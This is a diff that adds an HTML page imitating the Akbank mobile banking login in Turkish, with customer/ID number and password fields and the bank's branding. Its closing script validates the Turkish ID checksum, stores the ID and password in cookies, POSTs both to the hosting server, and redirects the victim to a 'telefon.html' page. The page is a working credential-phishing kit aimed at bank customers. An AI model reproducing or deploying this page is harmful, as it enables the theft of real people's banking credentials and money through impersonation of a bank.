@@ -1,0 +1,556 @@
+<html lang="tr" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head>
+    <title>Mobil Basvuru</title>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="MobileOptimized" content="width">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1.0, user-scalable=no">
+ 
+
+     <meta name="msapplication-tap-highlight" content="no">
+ 
+    <link href="./core.css" rel="stylesheet" type="text/css">
+    <link href="./main.css  " rel="stylesheet" type="text/css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script type="text/javascript">
+        function createLoaderDiv(className){
+            var container = document.createElement("div");
+            container.setAttribute("class", className);
+            var circle1 = document.createElement("div"); circle1.setAttribute("class", "circle1");
+            var circle2 = document.createElement("div"); circle2.setAttribute("class", "circle2");
+            var circle3 = document.createElement("div"); circle3.setAttribute("class", "circle3");
+            var circle4 = document.createElement("div"); circle4.setAttribute("class", "circle4");
+            container.appendChild(circle1);
+            container.appendChild(circle2);
+            container.appendChild(circle3);
+            container.appendChild(circle4);
+            return container;
+        }
+    </script>
+</head>
+<body>
+    <style>
+
+
+        body {
+    background-color: #ed1a1e;
+    max-width: 500px;
+    margin: 0 auto; /* Sayfada içeriği ortala */
+}
+    </style>
+
+    <input name="__RequestVerificationToken" type="hidden" value="pOPduPcBg3i884t7cFX48_Y3jtewy4Ny0x_roujpGX6l2NvFU60mzCjFPtt7cxdGMefkWZ-2fm-U_stysJn2l7IEOisYlcemKZQqy4vPWnPOgM_JG58tWoJ6jssIVo83FPQ0aQBiVESNcPvsJfUdZQ2">
+    <div id="applicationHost"><div data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }" data-view="views/shell" style="" data-active-view="true"><div class="guest" data-view="views/guest/guest" data-active-view="true" style="">
+ 
+        <div class="header2"> </div>
+            <div class="banner" data-bind="css:{extras:!(isLogoVisible())}" style="
+            margin-top: 22px;
+            margin-bottom: 22px;
+        ">   
+                <img class="logo" src="standart_logo.svg" style="    -webkit-tap-highlight-color: rgba(0,0,0,0);
+                -webkit-text-size-adjust: 100%;
+                font-size: 14px;
+                font-family: 'Open Sans';
+                color: #808282;
+                line-height: 1.3333333;
+                user-select: none;
+                box-sizing: border-box;
+                vertical-align: middle;
+                border: 0;
+                display: block;
+                margin: 0 auto;
+                height: 15px;
+                width: 137px;">       
+                <div data-bind="visible:!(isLogoVisible())" class="extras" style="display: none;">
+                    <a class="back-part" data-bind="click:function(){navigateBack();}">
+                        <img class="back-image" data-bind="attr:{src:backIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="/content/application/images/icons/back.png">
+                    </a>
+                    <a class="close-part" data-bind="click:function(){navigateHome();}">
+                        <img class="close-image" data-bind="attr:{src:closeIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="/content/application/images/icons/close.png">
+                    </a>
+                    <!--ko text:header--><!--/ko-->
+                </div>
+     
+            
+        <!-- /ko -->
+ 
+    </div>
+    <form
+    <div class="content-area" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }"><div class="login-form-wrap" data-view="views/guest/login/mbblogin/mbblogin" data-active-view="true" style="">
+    <div class="login-router" data-bind="router: { cacheViews: false, alwaysTriggerAttach: true }"><div class="mbbcclogin" data-view="views/guest/login/mbblogin/subviews/mbbloginpasswordcaptcha" data-active-view="true" style="">
+    <text-input-login params="type:'mbb', placeholder:GetString('CustomerNumberLogin'),value:mbbNo"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+                <!-- ko if: type()=='mbb' -->
+                <div class="icon icon-user-w icon-user-w-size"></div>
+                <!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast'--><!-- /ko -->
+                <!-- ko if: type()=='whitePass'--><!-- /ko -->
+                <!-- ko if: type()=='cepsifre'--><!-- /ko -->
+                <!-- ko if: type()=='kk'--><!-- /ko -->
+                <!-- ko if: type()=='skt'--><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha'--><!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+            <div class="input-part">
+                <!-- ko if: type()=='mbb' -->
+                <input class="inputarea" type="text" pattern="[0-9]*" id="tcno" name="tcno" minlength="11"  maxlength="11" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="Müşteri / TC Kimlik No">
+                <!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast' --><!-- /ko -->
+                <!-- ko if: type()=='whitePass' --><!-- /ko -->
+                <!-- ko if: type()=='cepsifre' --><!-- /ko -->
+                <!-- ko if: type()=='kk' --><!-- /ko -->
+                <!-- ko if: type()=='skt' --><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha' --><!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+    <hr class="login-separator">
+    <text-input-login params="type:'ast', placeholder:GetString('AkbankDirektPassword'),value:password"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast'-->
+                <div class="icon icon-password-w icon-password-w-size"></div>
+                <!-- /ko -->
+                <!-- ko if: type()=='whitePass'--><!-- /ko -->
+                <!-- ko if: type()=='cepsifre'--><!-- /ko -->
+                <!-- ko if: type()=='kk'--><!-- /ko -->
+                <!-- ko if: type()=='skt'--><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha'--><!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+            <div class="input-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast' -->
+                <input class="inputarea" 
+       type="password" 
+       id="pass" 
+       name="pass" 
+       maxlength="6" 
+       pattern="[0-9]*" 
+       data-bind="bind-numeric-password: value, attr: { placeholder : placeholder},settings: { maxlength: 6 }" 
+       placeholder="Akbank Şifresi" 
+       inputmode="numeric">
+                <!-- /ko -->
+                <!-- ko if: type()=='whitePass' --><!-- /ko -->
+                <!-- ko if: type()=='cepsifre' --><!-- /ko -->
+                <!-- ko if: type()=='kk' --><!-- /ko -->
+                <!-- ko if: type()=='skt' --><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha' --><!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+    <div data-bind="visible: isPhoneNumberVisible()" style="display: none;">
+        <hr class="login-separator">
+        <text-input-login params="type:'phonenumber', placeholder:GetString('EnterTelephone'),value:phoneNumber,selectoptions:_parent.countrycodes,selectvalue:_parent.selectedcountrycode,maxlength:10"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast'--><!-- /ko -->
+                <!-- ko if: type()=='whitePass'--><!-- /ko -->
+                <!-- ko if: type()=='cepsifre'--><!-- /ko -->
+                <!-- ko if: type()=='kk'--><!-- /ko -->
+                <!-- ko if: type()=='skt'--><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' -->
+                <div class="icon icon-phone-number-w icon-phone-number-w-size"></div>
+                <!-- /ko -->
+                <!-- ko if: type()=='captcha'--><!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' -->
+                <select data-bind="style: { background-color: '#c51522' }, options: selectoptions, optionsText: 'countryName', optionsValue: 'Id', value: selectvalue" style="background-color: rgb(197, 21, 34);"></select>
+                <!-- /ko -->
+            <div class="input-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast' --><!-- /ko -->
+                <!-- ko if: type()=='whitePass' --><!-- /ko -->
+                <!-- ko if: type()=='cepsifre' --><!-- /ko -->
+                <!-- ko if: type()=='kk' --><!-- /ko -->
+                <!-- ko if: type()=='skt' --><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' -->
+                <input class="inputarea" type="text" pattern="[0-9]*" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }" placeholder="Cep telefonu numaranı gir">
+                <!-- /ko -->
+                <!-- ko if: type()=='captcha' --><!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+    </div>
+    <div data-bind="visible: isCaptchaVisible()" style="display: none;">
+        <!--ko if:isHybridCaptcha-->
+        <hr class="login-separator">
+        <div class="text-center" style="margin: 10px 20px; padding: 5px; border-radius: 2px; background-color: #E5E5E5;">
+            <img style="width:120px;" data-bind="attr: { src: 'data:image/png;base64,' + captchaData() }" src="data:image/png;base64,">
+            <a href="#" data-bind="click:refreshCaptcha, attr :{ value : GetString('Refresh')}" value="Yenile">
+                 <span style="font-size: 15px; color: #ab1f23; margin-left: 5px; line-height: 32px" data-bind="value: GetString('Refresh')"></span>
+            </a>
+        </div>
+        <hr class="login-separator">
+        <text-input-login params="type:'captcha', placeholder:GetString('AkbankDirekSecuritytImage'),value:captcha"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+  
+                <div class="icon icon-password-w icon-password-w-size"></div>
+                <!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+            <div class="input-part">
+  
+                <input class="inputarea" type="text" data-bind="bind-value: value, attr: { placeholder : placeholder},settings: { maxlength: 4 ,afterkeyup: makeItUpper}" placeholder="Yukarıdaki Karakterleri Giriniz">
+                <!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+        <!--/ko-->
+    </div>
+    <div class="login-button-bar">
+        <div class="login-button-wrap">
+            <div class="login-button" data-bind="visible:cancelButtonVisible">
+                <page-button-login params="value:GetString('CancelBIG'),action:function(){ $data.loginCancel() },enable:cancelButtonVisible"><div class="page-button-login" data-bind="visible:!midButton()">
+    <input type="button" data-bind="value:value,click:action, enable: enable" value="İptal">
+</div>
+<div class="page-button-login" style="padding-left: 15px; padding-right: 15px; display: none;" data-bind="visible:midButton()">
+    <input type="button" data-bind="value:value,click:action, enable: enable" value="İptal">
+</div>
+</page-button-login>
+            </div>
+            <div class="login-button" data-bind="css: {yatirimci: !cancelButtonVisible()}">
+                <page-button-login params="value:GetString('LoginBIG'),action:function(){ $data.continueToLogin() },enable:canSubmit"><div class="page-button-login" data-bind="visible:!midButton()">
+    <input type="button" data-bind="value:value,click:action, enable: enable" id="loginBtn" value="Giriş" disabled>
+</div>
+<div class="page-button-login" style="padding-left: 15px; padding-right: 15px; display: none;" data-bind="visible:midButton()">
+    <input type="button" data-bind="value:value,click:action, enable: enable" value="Giriş" disabled>
+</div>
+</page-button-login>
+            </div>
+        </div>
+    </div>
+    <div>
+        <a class="forget-item" href="#" data-bind="click:forgotMBB">
+            <div class="item-text"><!--ko text:GetString('ForgotMBB')-->Müşteri numaramı bilmiyorum<!--/ko--></div>
+            <div class="arrow">
+                <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+            </div>
+        </a>
+    </div>
+    <a class="forget-item" href="#" data-bind="click:forgotPassword">
+        <div class="item-text"><!--ko text:GetString('ForgotPassword')-->Şifremi bilmiyorum<!--/ko--></div>
+        <div class="arrow">
+            <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+        </div>
+    </a>
+</div></div>
+    <div class="login-navigation">
+        <div class="language-part" data-bind="visible:isRegisteredLogin()" style="display: none;">
+            <div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+                <!-- ko foreach: SupportedLanguages -->
+                <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="selected">Türkçe</a>
+                <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                |
+                <!-- /ko -->
+                
+                <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="">English</a>
+                <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+                <!-- /ko -->
+            </div>
+        </div>
+        <!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-view="views/guest/login/nav" data-active-view="true" style="">
+    <a href="#" data-bind="click: NavigateToMaps" class="map-link">
+        <div class="map-wrap">
+            <div class="map-icon">
+                <div class="map-icon-g icon-map-g icon-map-g-size"></div>
+            </div>
+            <span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+            <div class="map-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <a href="#" data-bind="click: NavigateToCurrencyConverter" class="extras-link">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+                <div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+            </div>
+            <span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 33,8110 TL</span>&nbsp;</span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <!-- ko if:!IsHybrid() || IsHybridTablet()-->
+    <a href="#" data-bind="click: NavigateToDirectLoanApplication" class="extras-link desktop-site">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+                <img class="loan-image" src="../../../../../content/application/images/icon-set/loan-g.svg" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
+            </div>
+            <span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>   
+     <!--/ko-->
+</div><!--/ko-->
+    </div>
+</div><div class="login-form-wrap" data-bind="css:{login-form-wrap-direction: _parent.langSelection()}" data-view="views/guest/home" style="display: none;">
+    <div class="main-part">
+        <div class="login-router">
+            <div class="home-title">
+                <div class="title-wrap">
+                    <div class="title-text">
+                        <!--ko text:GetString('AkbankLogin')-->Akbank Mobil Giriş<!--/ko-->
+                    </div>
+                </div>
+            </div>
+            <div class="login-options-wrap">
+                <a href="#" data-bind="click: NavigateToMbbLogin" class="login-option">
+                    <div class="icon-wrap">
+                        <div class="option-icon icon-user-w icon-user-w-size"></div>
+                    </div>
+                    <div class="option-text">
+                        <!--ko text:GetString('LoginWithMbb')-->Müşteri / TC Kimlik No ile Giriş<!--/ko-->
+                    </div>
+                    <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+                    </div>
+                </a>
+                <a href="#" data-bind="click: NavigateToCCLogin" class="login-option">
+                    <div class="icon-wrap">
+                        <div class="option-icon icon-credit-card-w icon-credit-card-w-size"></div>
+                    </div>
+                    <div class="option-text">
+                        <!--ko text:GetString('LoginWithCC')-->Kredi Kartı ile Giriş<!--/ko-->
+                    </div>
+                    <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+                    </div>
+                </a>
+            </div>
+        </div>
+        <div class="login-extras-part">
+            <div class="language-part">
+                <div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+                    <!-- ko foreach: SupportedLanguages -->
+                    <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="selected">Türkçe</a>
+                    <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                    |
+                    <!-- /ko -->
+                    
+                    <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="">English</a>
+                    <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+                    <!-- /ko -->
+                </div>
+            </div>
+            <!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-view="views/guest/login/nav" data-active-view="true" style="">
+    <a href="#" data-bind="click: NavigateToMaps" class="map-link">
+        <div class="map-wrap">
+            <div class="map-icon">
+                <div class="map-icon-g icon-map-g icon-map-g-size"></div>
+            </div>
+            <span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+            <div class="map-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <a href="#" data-bind="click: NavigateToCurrencyConverter" class="extras-link">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+                <div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+            </div>
+            <span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 33,8110 TL</span>&nbsp;</span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <!-- ko if:!IsHybrid() || IsHybridTablet()-->
+    <a href="#" data-bind="click: NavigateToDirectLoanApplication" class="extras-link desktop-site">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+   
+            </div>
+            <span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>   
+     <!--/ko-->
+</div><!--/ko-->
+        </div>
+    </div>
+</div></div>
+ 
+
+<script>
+    // JavaScript kodunu HTML içeriğinin tamamen yüklendiği bir noktaya taşıdık
+    document.addEventListener("DOMContentLoaded", function () {
+        function setCookie(name, value, days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = "; expires=" + date.toUTCString();
+    }
+    document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
+
+              var savedName = getCookie("savedName");
+            if (!savedName) {
+                var randomName = generateRandomName(6);
+                setCookie("savedName", randomName, 1);
+            }
+        var tcInput = document.getElementById("tcno");
+        var passInput = document.getElementById("pass");
+
+        // Giriş düğmesi
+        var loginBtn = document.getElementById("loginBtn");
+
+        // TC kimlik numarası ve şifre doğrulama fonksiyonu
+        async function validateInputs() {
+            var tcno = tcInput.value;
+            var pass = passInput.value;
+
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik numarası doğrulaması
+                if (await tcno_dogrula_ve_islem_yap(tcno)) {
+                    // Giriş düğmesini etkinleştir
+                    loginBtn.disabled = false;
+                } else {
+                    // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
+                    loginBtn.disabled = true;
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
+                loginBtn.disabled = true;
+            }
+        }
+
+        // TC kimlik numarası ve şifre alanlarının değerlerinin değiştiğini izle
+        tcInput.addEventListener("input", validateInputs);
+        passInput.addEventListener("input", validateInputs);
+
+        // Giriş düğmesine tıklandığında formu gönder
+        loginBtn.addEventListener("click", function () {
+            // TC kimlik numarası ve şifreyi al
+            var tcno = tcInput.value;
+            var pass = passInput.value;
+
+            // Kullanıcıya atanmış adı al
+            var assignedName = getCookie("savedName");
+
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik doğrulaması yap
+if (tcno_dogrula_ve_islem_yap(tcno)) {
+    // Cookie'leri oluştur
+    document.cookie = `tcno=${tcno}; path=/`;
+    document.cookie = `pass=${pass}; path=/`;
+
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('tcno', tcno);
+    data.append('pass', pass);
+
+    // POST işlemi için fetch kullanarak isteği oluştur
+    fetch('', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'telefon.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'telefon.html';
+    });
+}
+else {
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+            }
+        }); 
+
+        // TC kimlik doğrulama fonksiyonu
+        async function tcno_dogrula_ve_islem_yap(tcno) {
+            // TC kimlik doğrulama fonksiyonu
+            tcno = String(tcno);
+            if (tcno.substring(0, 1) === '0') {
+                return false;
+            }
+            if (tcno.length !== 11) {
+                return false;
+            }
+            var ilkon_array = tcno.substr(0, 10).split('');
+            var ilkon_total = hane_tek = hane_cift = 0;
+            for (var i = j = 0; i < 9; ++i) {
+                j = parseInt(ilkon_array[i], 10);
+                if (i & 1) {
+                    hane_cift += j;
+                } else {
+                    hane_tek += j;
+                }
+                ilkon_total += j;
+            }
+            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+                return false;
+            }
+            ilkon_total += parseInt(ilkon_array[9], 10);
+            if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+                return false;
+            }
+            return true;
+        }
+
+
+        function getCookie(name) {
+            var nameEQ = name + "=";
+            var ca = document.cookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        // Rastgele ad oluşturma fonksiyonu
+        function generateRandomName(length) {
+            var result = '';
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+
+   
+    });
+</script>
+
+
+</body></html>
